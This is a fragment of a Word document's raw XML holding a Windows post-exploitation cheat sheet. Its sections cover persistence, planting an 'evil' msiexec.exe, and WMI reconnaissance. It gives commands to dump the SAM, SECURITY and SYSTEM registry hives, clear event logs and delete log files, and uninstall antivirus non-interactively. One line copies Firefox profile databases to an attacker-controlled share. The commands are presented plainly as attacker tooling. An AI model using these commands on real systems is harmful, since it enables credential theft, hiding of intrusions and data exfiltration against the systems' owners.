            </w:numPr>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
            </w:tabs>
            <w:ind w:left="720" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">v</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">er (Returns kernel version - like uname on *nix)</w:delText>
        </w:r>
      </w:del>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20"/>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3"/>
        <w:gridCol w:w="7607"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="2673"/>
            <w:gridCol w:w="7607"/>
          </w:tblGrid>
        </w:tblGridChange>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="78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Windows NT 6.1, 6.0</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%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\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Windows NT 5.2, 5.1, 5,0</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%SystemDrive%\Documents And Settings\All Users\Start Menu\Programs\StartUp\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Windows 9x</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%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\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Windows NT 4.0, 3.51, 3.50</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%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000844">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>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u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_tobsi71czv2p" w:id="337"/>
        <w:bookmarkEnd w:id="337"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Persistance</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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This section focuses on gaining a foothold to re-gain, or re-obtain access to a system through means of authentication, backdoors, etc..</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000846">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>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u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_olmlns7ipvwp" w:id="338"/>
        <w:bookmarkEnd w:id="338"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Binary Planting</w:delText>
        </w:r>
      </w:del>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bl>
      <w:tblPr>
        <w:tblStyle w:val="Table21"/>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b w:val="1"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:b w:val="1"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:b w:val="1"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:b w:val="1"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Location / File name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firstLine="0"/>
              <w:rPr>
                <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
                <w:b w:val="1"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:b w:val="1"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:b w:val="1"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:b w:val="1"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Reason / 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msiexec.exe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Idea taken from here: </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:color w:val="1155cc"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:color w:val="1155cc"/>
                      <w:u w:val="single"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">http://goo.gl/E3LTa</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> - basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">path </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">you get code execution.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%SystemRoot%\System32\wbem\mof\</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Taken from stuxnet: </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:color w:val="1155cc"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:color w:val="1155cc"/>
                      <w:u w:val="single"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> Look for Print spooler vuln</w:delText>
              </w:r>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Check the $PATH environmental variable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u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">Some directories may be writable. See: </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:color w:val="1155cc"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:color w:val="1155cc"/>
                      <w:u w:val="single"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">https://www.htbridge.com/advisory/HTB23108</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:del>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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr/>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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 </w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000852">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7h30potwraal" w:id="339"/>
        <w:bookmarkEnd w:id="339"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">WMI</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000853">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>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4"/>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bios</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000854">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qfe</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> qfe get hotfixid</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000855">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>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4"/>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  (This gets patches IDs)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000856">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startupwmic service</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000857">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process get caption,executablepath,commandline</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000858">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process call create “process_name” (executes a program)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000859">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process where name=”process_name” call terminate (terminates program)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000085A">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logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000085B">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useraccount (usernames, sid, and various security related goodies)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000085C">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useraccount get /ALL</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000085D">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share get /ALL (you can use ? for gets help ! )</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000085E">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startup list full (this can be a huge list!!!)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000085F">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/node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000860">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7u33sdu4oulz" w:id="340"/>
        <w:bookmarkEnd w:id="340"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Reg Command exit</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000861">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save HKLM\Security security.hive  (Save security hive to a file)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000862">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save HKLM\System system.hive (Save system hive to a file)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000863">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7"/>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save HKLM\SAM sam.hive (Save sam to a file)=</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000864">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add [\\TargetIPaddr\] [RegDomain][ \Key ] </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000865">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export [RegDomain]\[Key] [FileName] </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000866">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import [FileName ]</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000867">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8"/>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reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000868">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95llvp1i0eel" w:id="341"/>
        <w:bookmarkEnd w:id="341"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Deleting Logs</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000869">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wevtutil el  (list logs)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000086A">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wevtutil cl &lt;LogName&gt; (Clear specific lowbadming)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000086B">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9"/>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del %WINDIR%\*.log /a /s /q /f</w:delText>
        </w:r>
      </w:del>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6D">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89lj4wom3v17" w:id="342"/>
        <w:bookmarkEnd w:id="342"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Uninstalling Software “AntiVirus” (Non interactive)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000086E">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product get name /value (this gets software names)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000086F">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wmic product where name="XXX" call uninstall /nointeractive (this uninstalls software)</w:delText>
        </w:r>
      </w:del>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71">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n8l5wator02h" w:id="343"/>
        <w:bookmarkEnd w:id="343"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"># Other  (to be sorted)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000872">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pkgmgr usefull  /iu :”Package”</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000873">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pkgmgr usefull  /iu :”TelnetServer” (Install Telnet Service ...)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000874">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pkgmgr /iu:”TelnetClient” (Client )</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000875">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rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000876">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wscript.exe &lt;script js/vbs&gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000877">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cscript.exe &lt;script js/vbs/c#&gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000878">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xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000879">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after="0" w:before="0" w:lineRule="auto"/>
        <w:ind w:left="1440" w:hanging="360"/>
        <w:rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">
          <w:pPr>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="66"/>
            </w:numPr>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
            </w:tabs>
            <w:spacing w:after="0" w:before="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OS SPECIFIC</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">wmic</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Win2k3</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000087A">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70"/>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winpop stat domainname</w:delText>
        </w:r>
      </w:del>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7C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>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anvlrk8jqsf5" w:id="344"/>
        <w:bookmarkEnd w:id="344"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Vista/7</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000087D">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winstat features</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000087E">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wbadmin get status</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000087F">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wbadmin get items</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000880">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gpresult /H gpols.htm</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000881">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rPr>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
        </w:rPr>
        <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-11-04T09:54:30Z">
          <w:pPr>
            <w:keepNext w:val="0"/>
            <w:keepLines w:val="0"/>
            <w:widowControl w:val="0"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="48"/>
            </w:numPr>
            <w:pBdr>
              <w:top w:space="0" w:sz="0" w:val="nil"/>
              <w:left w:space="0" w:sz="0" w:val="nil"/>
              <w:bottom w:space="0" w:sz="0" w:val="nil"/>
              <w:right w:space="0" w:sz="0" w:val="nil"/>
              <w:between w:space="0" w:sz="0" w:val="nil"/>
            </w:pBdr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
            </w:tabs>
            <w:spacing w:line="240" w:lineRule="auto"/>
            <w:ind w:left="1440" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>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bcdedit /export &lt;filename&gt;</w:delText>
        </w:r>
      </w:del>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83">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>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fpk0evmlh5z7" w:id="345"/>
        <w:bookmarkEnd w:id="345"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
